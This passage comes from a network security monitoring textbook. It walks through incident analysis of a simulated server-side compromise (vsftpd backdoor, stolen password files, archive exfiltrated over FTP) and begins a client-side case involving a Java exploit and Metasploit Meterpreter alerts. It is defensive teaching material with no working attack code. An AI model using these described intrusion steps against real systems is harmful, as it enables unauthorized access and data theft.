  type: TYPE_NORMAL
- en: This confirms the successful transfer of *mysql-ssl.tar.gz* }, because that
    file is now listed and stored on an FTP server controlled by the intruder. This
  prefs: []
  type: TYPE_NORMAL
- en: could be bad news for Vivian’s Pets, if that file is a sensitive archive.
  prefs: []
  type: TYPE_NORMAL
- en: Thanks to capturing full content data, we also have a copy of *mysql-ssl*
  prefs: []
  type: TYPE_NORMAL
- en: '*.tar.gz* at our disposal. The *gzip* archive represented by file *192.168.003.005*'
  prefs: []
  type: TYPE_NORMAL
- en: '*.33012-203.000.113.004.00020* { is likely the *mysql-ssl.tar.gz* file stolen
    by the intruder. We extract it using the tar program, as shown in Listing 10-19\.
    As'
  prefs: []
  type: TYPE_NORMAL
- en: you can see, it appears to contain the keys associated with a MySQL server.
  prefs: []
  type: TYPE_NORMAL
- en: $ **tar -xzvf 192.168.003.005.33012-203.000.113.004.00020**
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl/
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl/yassl-1.9.8.zip
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl/my.cnf
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl/mysqld.gdb
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl/mysql-keys/
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl/mysql-keys/server-cert.pem
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl/mysql-keys/ca-cert.pem
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl/mysql-keys/client-req.pem
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl/mysql-keys/server-key.pem
  prefs: []
  type: TYPE_NORMAL
- en: '**230** Chapter 10'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl/mysql-keys/server-req.pem
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl/mysql-keys/client-key.pem
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl/mysql-keys/client-cert.pem
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl/mysql-keys/ca-key.pem
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-19: Contents of the* mysql-ssl .tar .gz *archive stolen by the
    intruder* With this data in hand, the Vivian’s Pets CIRT must summarize what'
  prefs: []
  type: TYPE_NORMAL
- en: has happened in order to fully understand the intrusion.
  prefs: []
  type: TYPE_NORMAL
- en: '**Stepping back**'
  prefs: []
  type: TYPE_NORMAL
- en: At this point in the NSM process, the CIRT should consider what it under-
  prefs: []
  type: TYPE_NORMAL
- en: stands about the intrusion before making recommendations to business
  prefs: []
  type: TYPE_NORMAL
- en: owners. Using illustrations to depict what has happened at each stage is a
  prefs: []
  type: TYPE_NORMAL
- en: helpful analytical step.
  prefs: []
  type: TYPE_NORMAL
- en: '***Summarizing Stage 1***'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10-13 summarizes the first few phases of this intrusion, which we can
  prefs: []
  type: TYPE_NORMAL
- en: call stage 1\.
  prefs: []
  type: TYPE_NORMAL
- en: 1\. Intruder conducts reconnaissance against two potential victims.
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK SCANNING
  prefs: []
  type: TYPE_NORMAL
- en: Victim 1
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 1
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: Victim 2
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.13
  prefs: []
  type: TYPE_NORMAL
- en: 2\. Intruder exploits vsftpd service on Victim 1\.
  prefs: []
  type: TYPE_NORMAL
- en: Victim 1
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 1
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: Exploited
  prefs: []
  type: TYPE_NORMAL
- en: 3\. Intruder connects to backdoor on Victim 1\.
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 1
  prefs: []
  type: TYPE_NORMAL
- en: Victim 1
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: 4\. Intruder fails to exploit vsftpd service on Victim 2\.
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: Victim 2
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 1
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.13
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: Safe
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-13: Stage 1 of server-side compromise*'
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **231**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'In stage 1, the intruder at 203.0.113.10 conducted network reconnaissance against
    two computers: 192.168.3.5 and 192.168.3.13\. The intruder'
  prefs: []
  type: TYPE_NORMAL
- en: found port 21 TCP listening on both systems, so he attempted to compro-
  prefs: []
  type: TYPE_NORMAL
- en: mise that service on both targets. He successfully compromised the vsftpd
  prefs: []
  type: TYPE_NORMAL
- en: server on 192.168.3.5, causing a backdoor to open on port 6200 TCP on
  prefs: []
  type: TYPE_NORMAL
- en: that system. He was not able to use the same technique to gain unauthor-
  prefs: []
  type: TYPE_NORMAL
- en: ized access to 192.168.3.13\.
  prefs: []
  type: TYPE_NORMAL
- en: '***Summarizing Stage 2***'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10-14 summarizes the remainder of this intrusion, called stage 2\.
  prefs: []
  type: TYPE_NORMAL
- en: 5\. Intruder 2 connects via SSH to Victim 1\.
  prefs: []
  type: TYPE_NORMAL
- en: SSH CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 2
  prefs: []
  type: TYPE_NORMAL
- en: Victim 1
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.77
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: 6\. Intruder 2 instructs Victim 1 to upload
  prefs: []
  type: TYPE_NORMAL
- en: stolen data to FTP server on Intruder 3\.
  prefs: []
  type: TYPE_NORMAL
- en: SSH CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 2
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.77
  prefs: []
  type: TYPE_NORMAL
- en: Victim 1
  prefs: []
  type: TYPE_NORMAL
- en: FTP CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 3
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.4
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-14: Stage 2 of server-side compromise*'
  prefs: []
  type: TYPE_NORMAL
- en: In stage 2, a new intruder IP address, 203.0.113.77, connects via SSH to
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5\. While interacting with the victim, the intruder created or dis-
  prefs: []
  type: TYPE_NORMAL
- en: covered an archive titled *mysql-ssl.tar.gz*. He then uploaded that archive
    via FTP to a third system, 203.0.113.4, which may be another FreeBSD system.
  prefs: []
  type: TYPE_NORMAL
- en: '***Next Steps***'
  prefs: []
  type: TYPE_NORMAL
- en: As explained in Chapter 9, escalation and resolution are the two phases fol-
  prefs: []
  type: TYPE_NORMAL
- en: lowing the collection and analysis phases of the NSM workflow. With analy-
  prefs: []
  type: TYPE_NORMAL
- en: sis complete, the CIRT must identify the owners of the affected systems,
  prefs: []
  type: TYPE_NORMAL
- en: and explain the nature of the data identified as being stolen. In turn, the
  prefs: []
  type: TYPE_NORMAL
- en: asset owner must evaluate the impact of the loss of data and simultaneously
  prefs: []
  type: TYPE_NORMAL
- en: authorize the CIRT to take short-term incident containment measures. The
  prefs: []
  type: TYPE_NORMAL
- en: most effective containment mechanism involves removing the compromised
  prefs: []
  type: TYPE_NORMAL
- en: systems from the network.
  prefs: []
  type: TYPE_NORMAL
- en: First, disconnect 192.168.3.5 from the network. We should consider
  prefs: []
  type: TYPE_NORMAL
- en: it untrustworthy because we don’t know what the intruder did during
  prefs: []
  type: TYPE_NORMAL
- en: his encrypted OpenSSH session. The CIRT should also determine if any
  prefs: []
  type: TYPE_NORMAL
- en: information on 192.168.3.5 is sensitive, to help decide whether this event
  prefs: []
  type: TYPE_NORMAL
- en: qualifies as a Breach 2 or Breach 1 incident. The differentiation lies in the
  prefs: []
  type: TYPE_NORMAL
- en: importance and sensitivity of the stolen data.
  prefs: []
  type: TYPE_NORMAL
- en: '**232** Chapter 10'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The CIRT should determine if any information taken from 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: could lead to other intrusions. Are there any accounts that could also be
  prefs: []
  type: TYPE_NORMAL
- en: used to log in to other Vivian’s Pets systems? Are there configuration files
  prefs: []
  type: TYPE_NORMAL
- en: that would enable additional access? Are any business partners or custom-
  prefs: []
  type: TYPE_NORMAL
- en: ers at risk? Involving the business, legal, and other teams may become
  prefs: []
  type: TYPE_NORMAL
- en: necessary as the CIRT evaluates the impact of the intrusion. Ultimately,
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5 should be retired because it is no longer a trustworthy plat-
  prefs: []
  type: TYPE_NORMAL
- en: 'form. This could be a hard lesson for the IT and security staff: When the'
  prefs: []
  type: TYPE_NORMAL
- en: Metasploitable developers warn users to keep their distribution off the
  prefs: []
  type: TYPE_NORMAL
- en: Internet, they mean it!
  prefs: []
  type: TYPE_NORMAL
- en: '**conclusion**'
  prefs: []
  type: TYPE_NORMAL
- en: This chapter walked through a server-side compromise. We utilized several
  prefs: []
  type: TYPE_NORMAL
- en: forms of NSM data to analyze an intrusion targeting two systems in the
  prefs: []
  type: TYPE_NORMAL
- en: Vivian’s Pets test network. By examining alert, session, full content, transac-
  prefs: []
  type: TYPE_NORMAL
- en: tion, and extracted content data, we learned that an intruder stole system
  prefs: []
  type: TYPE_NORMAL
- en: information and a compressed archive associated with MySQL.
  prefs: []
  type: TYPE_NORMAL
- en: We also learned that NSM data can’t answer every question by itself.
  prefs: []
  type: TYPE_NORMAL
- en: Once the intruder leveraged stolen credentials (via the */etc/passwd* and */etc/*
  prefs: []
  type: TYPE_NORMAL
- en: '*shadow* files) to connect via OpenSSH, we couldn’t see the commands he ran,'
  prefs: []
  type: TYPE_NORMAL
- en: although we could see derivative actions like uploading an archive via FTP.
  prefs: []
  type: TYPE_NORMAL
- en: Using an NSM tool bundled with Sguil, we rebuilt the stolen archive,
  prefs: []
  type: TYPE_NORMAL
- en: although we could have done the same sort of reassembly using Wireshark
  prefs: []
  type: TYPE_NORMAL
- en: or another tool.
  prefs: []
  type: TYPE_NORMAL
- en: This case introduced the idea of patterns of attack and how to analyze
  prefs: []
  type: TYPE_NORMAL
- en: them using NSM tools and methods. In the next chapter, we’ll turn the
  prefs: []
  type: TYPE_NORMAL
- en: tables slightly and review a client-side compromise.
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **233**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**11**'
  prefs: []
  type: TYPE_NORMAL
- en: '**c l i e N T- S i D e c o M P r o M i S e**'
  prefs: []
  type: TYPE_NORMAL
- en: In the previous chapter’s examples,
  prefs: []
  type: TYPE_NORMAL
- en: an intruder conducted reconnaissance
  prefs: []
  type: TYPE_NORMAL
- en: against remote targets, identified services,
  prefs: []
  type: TYPE_NORMAL
- en: and attacked them. After gaining access to
  prefs: []
  type: TYPE_NORMAL
- en: one system with a vulnerable service, the intruder
  prefs: []
  type: TYPE_NORMAL
- en: archived files of interest and exfiltrated them to a
  prefs: []
  type: TYPE_NORMAL
- en: remote server. All of this activity took place without
  prefs: []
  type: TYPE_NORMAL
- en: the explicit involvement of a user on the Vivian’s Pets
  prefs: []
  type: TYPE_NORMAL
- en: network.
  prefs: []
  type: TYPE_NORMAL
- en: This chapter demonstrates a client-side compromise—one of the other
  prefs: []
  type: TYPE_NORMAL
- en: major categories of malicious network activity you are likely to encounter.
  prefs: []
  type: TYPE_NORMAL
- en: Although this incident involves remote systems, the intruder does not initiate
  prefs: []
  type: TYPE_NORMAL
- en: the attack in the same manner as in a server-side compromise. We will use
  prefs: []
  type: TYPE_NORMAL
- en: similar NSM methodologies to detect and respond to the intrusion.
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**client-side compromise defined**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Client-side compromise* involves an intruder exploiting an application with'
  prefs: []
  type: TYPE_NORMAL
- en: which a user interacts. This application could be a web browser, email client,
  prefs: []
  type: TYPE_NORMAL
- en: media player, or any other program that users rely on for access to network
  prefs: []
  type: TYPE_NORMAL
- en: resources. An attacker might trick a user into visiting a compromised site
  prefs: []
  type: TYPE_NORMAL
- en: and revealing her credentials, or he might simply position himself to take
  prefs: []
  type: TYPE_NORMAL
- en: advantage of a routine that the user follows.
  prefs: []
  type: TYPE_NORMAL
- en: Client-side attacks have been popular since the mid-2000s, when attack-
  prefs: []
  type: TYPE_NORMAL
- en: ers realized that if they could convince a user application to execute (or be
  prefs: []
  type: TYPE_NORMAL
- en: subject to) malicious code, their attacks would be more likely to succeed.
  prefs: []
  type: TYPE_NORMAL
- en: Many organizations devote resources and expertise to countering server-side
  prefs: []
  type: TYPE_NORMAL
- en: attacks, but client-side attacks are much more difficult to stop or even detect.
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11-1 shows a generic attack pattern for a client-side compromise.
  prefs: []
  type: TYPE_NORMAL
- en: 1\. Victim executes malicious code on
  prefs: []
  type: TYPE_NORMAL
- en: system, after being solicited by intruder
  prefs: []
  type: TYPE_NORMAL
- en: or by innocent computer use.
  prefs: []
  type: TYPE_NORMAL
- en: PHISHING EMAIL
  prefs: []
  type: TYPE_NORMAL
- en: Intruder
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  prefs: []
  type: TYPE_NORMAL
- en: OR
  prefs: []
  type: TYPE_NORMAL
- en: WEBSITE VISIT
  prefs: []
  type: TYPE_NORMAL
- en: Website hosting
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  prefs: []
  type: TYPE_NORMAL
- en: malicious code
  prefs: []
  type: TYPE_NORMAL
- en: OR
  prefs: []
  type: TYPE_NORMAL
- en: SOCIAL MEDIA OR OTHER COMMUNICATION
  prefs: []
  type: TYPE_NORMAL
- en: Malicious code
  prefs: []
  type: TYPE_NORMAL
- en: on social media
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  prefs: []
  type: TYPE_NORMAL
- en: or other site
  prefs: []
  type: TYPE_NORMAL
- en: 2\. Attack method exploits vulnerable application
  prefs: []
  type: TYPE_NORMAL
- en: on victim system to execute code or commands,
  prefs: []
  type: TYPE_NORMAL
- en: Exploited
  prefs: []
  type: TYPE_NORMAL
- en: or run an unwanted malicious application.
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: Intruder
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  prefs: []
  type: TYPE_NORMAL
- en: 3\. Malicious code causes victim to reach back to intruder
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-1: Client-side compromise at ack pat ern*'
  prefs: []
  type: TYPE_NORMAL
- en: As you can see in Figure 11-1, three of the most popular client-side attacks
  prefs: []
  type: TYPE_NORMAL
- en: involve phishing email, visiting websites, and interacting with social media.
  prefs: []
  type: TYPE_NORMAL
- en: How is this possible?
  prefs: []
  type: TYPE_NORMAL
- en: '**236** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: In all three attacks, an intruder creates an unsafe communication of some type.
    With a phishing email message, perhaps the intruder attaches a
  prefs: []
  type: TYPE_NORMAL
- en: malicious executable, such as a document designed to exploit a vulnerable
  prefs: []
  type: TYPE_NORMAL
- en: application like Microsoft Word or Adobe Reader. Phishing email messages
  prefs: []
  type: TYPE_NORMAL
- en: or social media may also contain links to malicious websites operated by the
  prefs: []
  type: TYPE_NORMAL
- en: intruder specifically to perform attacks. The target site could also be a com-
  prefs: []
  type: TYPE_NORMAL
- en: pletely legitimate one, such as a news or sports page, where an attacker has
  prefs: []
  type: TYPE_NORMAL
- en: inserted malicious code that compromises those who visit the site.
  prefs: []
  type: TYPE_NORMAL
- en: The latest variants of these attacks are called *watering hole* or *strategic
    website compromise* attacks. An intruder compromises a website that she expects
  prefs: []
  type: TYPE_NORMAL
- en: her targets to visit, such as a human rights or think tank site. When interested
  prefs: []
  type: TYPE_NORMAL
- en: parties visit the site, malicious code attacks them without their knowledge.
  prefs: []
  type: TYPE_NORMAL
- en: These attacks are fairly devastating because they are not tightly targeted
  prefs: []
  type: TYPE_NORMAL
- en: (the intruder can’t be sure that her intended prey will visit the website),
  prefs: []
  type: TYPE_NORMAL
- en: but they can be very stealthy because victims surfing the Web normally are
  prefs: []
  type: TYPE_NORMAL
- en: unwittingly caught in this trap.
  prefs: []
  type: TYPE_NORMAL
- en: Client-side attacks can result in the same levels of access as server-side
  prefs: []
  type: TYPE_NORMAL
- en: attacks (discussed in Chapter 10). An attempt to exploit a vulnerable appli-
  prefs: []
  type: TYPE_NORMAL
- en: cation, regardless of whether it succeeds, is a Cat 3 incident. If the attack
  prefs: []
  type: TYPE_NORMAL
- en: succeeds and the intruder achieves user-level access, the scenario now quali-
  prefs: []
  type: TYPE_NORMAL
- en: fies as a Cat 2 intrusion. If the intruder gains administrator- or root-level
  prefs: []
  type: TYPE_NORMAL
- en: privileges, we must deal with a Cat 1 intrusion. Once the intruder estab-
  prefs: []
  type: TYPE_NORMAL
- en: lishes a command-and-control channel, it’s Breach 3\. And if the intruder
  prefs: []
  type: TYPE_NORMAL
- en: begins stealing data or taking other actions, we could be dealing with a
  prefs: []
  type: TYPE_NORMAL
- en: Breach 2 or even a Breach 1 intrusion. (See Figure 9-5 o[n page 194](index_split_004.html#p228)
    for intrusion category definitions.) Whatever the category, the goal of the CIRT
  prefs: []
  type: TYPE_NORMAL
- en: is, as always, to quickly determine the extent of the incident and to take
  prefs: []
  type: TYPE_NORMAL
- en: rapid actions to contain the attack and mitigate risk of data loss, alteration,
  prefs: []
  type: TYPE_NORMAL
- en: or degradation.
  prefs: []
  type: TYPE_NORMAL
- en: '**client-side compromise in action**'
  prefs: []
  type: TYPE_NORMAL
- en: For this chapter’s example, we’ll look at a client-side compromise that takes
  prefs: []
  type: TYPE_NORMAL
- en: place on the Vivian’s Pets network but involves different computers. To
  prefs: []
  type: TYPE_NORMAL
- en: make the situation slightly more complicated, the activity in question will
  prefs: []
  type: TYPE_NORMAL
- en: be monitored by an NSM sensor watching two segments. This is a configu-
  prefs: []
  type: TYPE_NORMAL
- en: ration supported by SO and it seems like a good choice when the hardware
  prefs: []
  type: TYPE_NORMAL
- en: in question can support the additional load. We’ll see if that decision is jus-
  prefs: []
  type: TYPE_NORMAL
- en: tified! The network appears as shown in Figure 11-2\.
  prefs: []
  type: TYPE_NORMAL
- en: With this sensor configuration, the NSM platform will see traffic both
  prefs: []
  type: TYPE_NORMAL
- en: to and from the wireless network and the internal network. (I’ve completely
  prefs: []
  type: TYPE_NORMAL
- en: simulated the network here in order to include the NAT issues discussed
  prefs: []
  type: TYPE_NORMAL
- en: earlier in the book, but they do not play a major role.)
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **237**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 132](index-272_1.png)'
  prefs: []
  type: TYPE_IMG
- en: Internet
  prefs: []
  type: TYPE_NORMAL
- en: Tap
  prefs: []
  type: TYPE_NORMAL
- en: Wireless
  prefs: []
  type: TYPE_NORMAL
- en: Network
  prefs: []
  type: TYPE_NORMAL
- en: Tap
  prefs: []
  type: TYPE_NORMAL
- en: NSM
  prefs: []
  type: TYPE_NORMAL
- en: Laptop
  prefs: []
  type: TYPE_NORMAL
- en: Internal
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37
  prefs: []
  type: TYPE_NORMAL
- en: Network
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-2: Wireless and internal network segments on Vivian’s Pets network*'
  prefs: []
  type: TYPE_NORMAL
- en: '***Getting the Incident Report from a User***'
  prefs: []
  type: TYPE_NORMAL
- en: One afternoon the Vivian’s Pets CIRT receives a call from a concerned user.
  prefs: []
  type: TYPE_NORMAL
- en: She reports logging in to Twitter and searching for messages to her user-
  prefs: []
  type: TYPE_NORMAL
- en: name. She noticed a tweet from an unfamiliar username, *Callbackpnsm*, and
  prefs: []
  type: TYPE_NORMAL
- en: the message was a little unsettling. The unknown tweet mentioned “updates
  prefs: []
  type: TYPE_NORMAL
- en: to our health care plan” and provided a link to a site with *healthcarenews*
    in the URL. Curious, she copied and pasted the URL into her Firefox web
  prefs: []
  type: TYPE_NORMAL
- en: browser to take a look. Figure 11-3 shows the suspicious tweet.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-3: Tweet from Cal backpnsm*'
  prefs: []
  type: TYPE_NORMAL
- en: When an unknown or suspicious Twitter user sends a link to an un-
  prefs: []
  type: TYPE_NORMAL
- en: recognized website, most security analysts become nervous. At this point,
  prefs: []
  type: TYPE_NORMAL
- en: the Vivian’s Pets CIRT suspects that the unfortunate user has fallen for a
  prefs: []
  type: TYPE_NORMAL
- en: '**238** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 133](index-273_1.png)'
  prefs: []
  type: TYPE_IMG
- en: client-side attack. The CIRT asks if the user recalls seeing anything suspi-
  prefs: []
  type: TYPE_NORMAL
- en: cious after visiting the URL. The user replies that she saw something about
  prefs: []
  type: TYPE_NORMAL
- en: a Java installation, and when she clicked through to learn about the health
  prefs: []
  type: TYPE_NORMAL
- en: care update, all she saw was a blank page.
  prefs: []
  type: TYPE_NORMAL
- en: The user became worried that something was wrong, so she decided
  prefs: []
  type: TYPE_NORMAL
- en: to turn to the CIRT to get some help. The CIRT thanks the user for her
  prefs: []
  type: TYPE_NORMAL
- en: report. It’s time to start investigating!
  prefs: []
  type: TYPE_NORMAL
- en: '***Starting Analysis with ELSA***'
  prefs: []
  type: TYPE_NORMAL
- en: One way to begin the analysis process is to query logs for the IP address in
  prefs: []
  type: TYPE_NORMAL
- en: the tweet. We’ll start with ELSA.
  prefs: []
  type: TYPE_NORMAL
- en: '**Querying for the IP address**'
  prefs: []
  type: TYPE_NORMAL
- en: First, we’ll make sure that the ELSA query time frame begins before the user
  prefs: []
  type: TYPE_NORMAL
- en: experienced the odd activity, and then we’ll add the IP address in question,
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15, to the search bar. The results are shown in Figure 11-4\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-4: Initial ELSA query results for 203.0.113.15*'
  prefs: []
  type: TYPE_NORMAL
- en: ELSA tells us that it has 244 records, but, by default, it limits itself to
  prefs: []
  type: TYPE_NORMAL
- en: 100 results. The oldest entry appears first. The results are not encourag-
  prefs: []
  type: TYPE_NORMAL
- en: ing, with mentions of malicious Java applet and Vulnerable Java Version
  prefs: []
  type: TYPE_NORMAL
- en: 1.7.x Detected. Seeing 0day JRE 17 metasploit Exploit Class is even worse.
  prefs: []
  type: TYPE_NORMAL
- en: 'Thankfully, we do now have the victim’s IP address: 172.16.0.37\. Rather'
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **239**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 134](index-274_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 135](index-274_2.png)'
  prefs: []
  type: TYPE_IMG
- en: than scroll through multiple pages of output, we select the program element
  prefs: []
  type: TYPE_NORMAL
- en: near the top of the screen to see a summary count of all data sources ELSA
  prefs: []
  type: TYPE_NORMAL
- en: possesses for this IP address. Figure 11-5 shows the result.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-5: ELSA displays data sources for logs for 203.0.113.15\.*'
  prefs: []
  type: TYPE_NORMAL
- en: As you can see, Snort alerts dominate the results, although there are
  prefs: []
  type: TYPE_NORMAL
- en: two HTTP records and one Bro connection log record.
  prefs: []
  type: TYPE_NORMAL
- en: '**Checking the Bro HttP Log**'
  prefs: []
  type: TYPE_NORMAL
- en: Clicking the *bro_http* link provides the results shown in Figure 11-6\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-6: ELSA displays Bro HTTP log records for 203.0.113.15\.*'
  prefs: []
  type: TYPE_NORMAL
- en: These two events bear the same timestamp in ELSA, but the Bro time-
  prefs: []
  type: TYPE_NORMAL
- en: stamp shows that the top request happened first. That seems a little odd,
  prefs: []
  type: TYPE_NORMAL
- en: given that it’s a request for *healthcarenews/Exploit.jar.pack.gz*. The second
  prefs: []
  type: TYPE_NORMAL
- en: record, with a later timestamp, is for the *healthcarenews* page itself.
  prefs: []
  type: TYPE_NORMAL
- en: Seeing a download for content titled *Exploit.jar.pack.gz* doesn’t inspire
  prefs: []
  type: TYPE_NORMAL
- en: confidence. We need to find out what else happened to this victim system.
  prefs: []
  type: TYPE_NORMAL
- en: '**Checking Snort alerts**'
  prefs: []
  type: TYPE_NORMAL
- en: Returning to the first open tab in ELSA, we notice the *sig_msg* link. Clicking
    this link creates a new tab with a summary count of each of the Snort alerts
  prefs: []
  type: TYPE_NORMAL
- en: associated with 203.0.113.15, as shown in Figure 11-7\.
  prefs: []
  type: TYPE_NORMAL
- en: The summary of observed Snort signatures includes references to the
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit Meterpreter, including the core_channel and stdapi, with Command
  prefs: []
  type: TYPE_NORMAL
- en: Request and Command Response for each. This is not encouraging either.
  prefs: []
  type: TYPE_NORMAL
- en: '**240** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 136](index-275_1.png)'
  prefs: []
  type: TYPE_IMG
- en: Metasploit ( *http://www.metasploit.com/*) is an open source reconnaissance
  prefs: []
  type: TYPE_NORMAL
- en: and exploitation framework created by HD Moore and now supported by
  prefs: []
  type: TYPE_NORMAL
- en: Rapid7 and a team of developers. The Meterpreter is a Metasploit *payload*,
  prefs: []
  type: TYPE_NORMAL
- en: code used by an attacker after initially gaining access to a target using an
  prefs: []
  type: TYPE_NORMAL
- en: exploit delivered by another Metasploit module. Terms like core_channel and
  prefs: []
  type: TYPE_NORMAL
- en: stdapi refer to functions and features in the Metasploit suite, and Command
  prefs: []
  type: TYPE_NORMAL
- en: Request and Command Response indicate communication between the attacker’s
  prefs: []
  type: TYPE_NORMAL
- en: system and the victim.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-7: ELSA displays a summary of Snort signatures for 203.0.113.15\.*'
  prefs: []
  type: TYPE_NORMAL
- en: The intruder appears to have gained the ability to execute code on the
  prefs: []
  type: TYPE_NORMAL
- en: victim via a Java exploit.
  prefs: []
  type: TYPE_NORMAL
- en: '**Searching for Other activity**'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we need to determine if this intruder interacted with any other systems.
  prefs: []
  type: TYPE_NORMAL
- en: To accomplish that task, we return to the first tab with all the information
    for
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15 and click the *srcip* link. ELSA tells us that only 203.0.113.15
    and 172.16.0.37 have records associated with 203.0.113.15, but for good measure,
  prefs: []
  type: TYPE_NORMAL
- en: we also click the *dstip* link and get the same results. That means we probably
    have a handle on all activity involving 203.0.113.15—that IP address did not
  prefs: []
  type: TYPE_NORMAL
- en: communicate with any other system we watch.
  prefs: []
  type: TYPE_NORMAL
- en: Still, that result doesn’t mean that no other activity affected the victim,
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37\. To investigate that lead, we run a new ELSA query for 172.16.0.37
  prefs: []
  type: TYPE_NORMAL
- en: and then click the *program* link to get a summary count of records. We need
  prefs: []
  type: TYPE_NORMAL
- en: to know what other connections 172.16.0.37 conducted. Figure 11-8 shows
  prefs: []
  type: TYPE_NORMAL
- en: the results.
  prefs: []
  type: TYPE_NORMAL
- en: We take a similar approach to investigating these logs. First, we check
  prefs: []
  type: TYPE_NORMAL
- en: out the Snort alerts, summarize them, and look for new information. Nothing
  prefs: []
  type: TYPE_NORMAL
- en: new appears here, except we see Snort alerts for package management,
  prefs: []
